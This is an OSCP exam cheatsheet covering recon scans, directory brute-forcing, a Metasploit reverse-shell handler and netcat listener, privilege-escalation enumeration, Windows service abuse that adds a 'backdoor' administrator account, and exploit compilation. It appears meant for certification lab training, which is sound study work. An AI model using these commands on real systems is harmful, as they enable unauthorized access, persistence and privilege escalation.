# OSCP
OSCP Exam Cheatsheet.

# Index

- [Recon](#recon) 
- [Preparation](#preparation) 

### RECON

Nmap port scans:
(NOTE: Heavy scanning may result in ports being filtered/closed - wait <15 minutes to be unbanned)
```bash
$ nmap 10.11.1.71 --top-ports 20 --open	# Top 20 TCP ports scan on initial box
$ nmap 10.11.1.71 -p- -sV		# Complete TCP port scan + service banner grab on each box:
```

For each service, check available Nmap scripts:
```bash
$ ls -l /usr/share/nmap/scripts/*ssh*
```

NSE script tests:
```bash
$ nmap -v -p 139,445 --script=smb-vuln-ms17-010.nse --script-args=unsafe=1 10.11.1.31
```

Linux SMB Enum
```bash
$ enum4linux [ target_ip ]	# Enumerate Windows / Samba (SMB) hosts.
```

!! FOLLOW A PROCESS !!

### DEEPER RECON (SERVICE-LEVEL) - WEBAPP EXAMPLE

Scripts:
```bash
$ curl -i -L 10.11.1.71 						  # Follow re-directs
$ curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//' # Internal/external links
$ gobuster -u http://10.11.1.71/ \					  # Directory brute-force
	   -w /usr/share/seclists/Discovery/Web_Content/common.txt \
	   -s '200,204,301,302,307,403,500' -e
$ gobuster -u http://10.11.1.71/cgi-bin/ \				  # 2nd directory brute-force
	   -w /usr/share/seclists/Discovery/Web_Content/cgis.txt \
	   -s '200,204,403,500' -e
```

Other things to check:
* robots.txt
* social media
* source code (if app is based on open-source code)

Re-evaluate attack surface:
* Any new findings to add to our list of attack vectors?

### FIND VULNS + EXPLOIT CODE

Tools:
```bash
# Nikto webapp scanner:
$ nikto -host 10.11.1.71

# Searchsploit (exploit-db):
$ searchsploit [options] [search_term1] [search_term2] . . . [search_termN]

# Nmap Scripting ENgine
$ ls -l /usr/share/nmap/scripts/*service_name*
```

Other areas to find exploit code:
* Google Shellshock POC
* Google one-liners from github

If no good attack vectors / exploit can be found, try a different or more comprehensive wordlist for subdirectory brute-forcing or use a webapp scanner to poke harder at the system.

### USING EXPLOIT CODE

Using the public exploit you found + Metasploit Multi-Handler, you can establish a Meterpreter session with the target.

Metasploit Handler usage w/ public exploit:
```bash
# SETUP HANDLER
$ msfconsole
$ msf > use exploit/multi/handler
$ msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
. . . 
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.11.0.31:443 
```

Meterpreter sometimes doesn't work.
Go back to using `nc -nvlp 80` and trigger reverse shell in vulnerable app/service.


### PRIVILEGE ESCALATION - ENUM

Get a proper shell: https://netsec.ws/?p=337
```bash
# This shell mostly works
python -c 'import pty; pty.spawn("/bin/sh")'
```

General privesc guide:
* https://www.reddit.com/r/oscp/comments/9ystub/i_absolutely_suck_at_privilege_escalation/?st=JOQAMPYP&sh=8899be73

Linux privesc:
* https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py (automated)
* https://github.com/rebootuser/LinEnum (automated)
* https://tools.kali.org/vulnerability-analysis/unix-privesc-check (automated - Kali)
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (manual)

Windows privesc:
* Automated scanner: https://github.com/azmatt/windowsEnum
* http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/
* http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
* https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
* Accesschk.exe: http://www.fuzzysecurity.com/tutorials/16.html
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

Quick Wins:
```bash
# THIS HAS WORKED BEFORE: Due to misconfiguration in /etc/sudoers
$ sudo su	# execute su as root
$ su root	# become root
```

Linux Privesc:
```bash
# OS? Version? Architecture?
$ cat /etc/*-release
$ uname -i
$ lsb_release -a (Debian)
 
# Who are we? Where are we? What are our sudo privileges?
$ id
$ pwd
$ sudo -l
 
# Other users? Which ones have a valid shell?
$ cat /etc/passwd
$ grep -vE "nologin|false" /etc/passwd
 
# Services running on the box? Network services running?
ps aux
netstat -antup
 
# Whats installed? Kernel?
dpkg -l (Debian)
rpm -qa (CentOS / openSUSE)
uname -a
```

Windows Privesc:
```powershell
# Vulnerable services
sc qc <vulnerable service name>
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 

sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
net start <vulnerable-service>
```

Summarise possible attack vectors / vulnerable services to escalate privileges.



### EXPLOITS - USING / COMPILING

Compilation tips:
* `./exploit` results in errors: compile in the host itself, Kali box or another machine.

Useful compilation commands:
```bash
# Linux
$ gcc -m32 -Wl,--hash-style=both exploit.c -o exploit

# Windows (cross-compile) and run
$ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32
$ wine exploit.exe
```


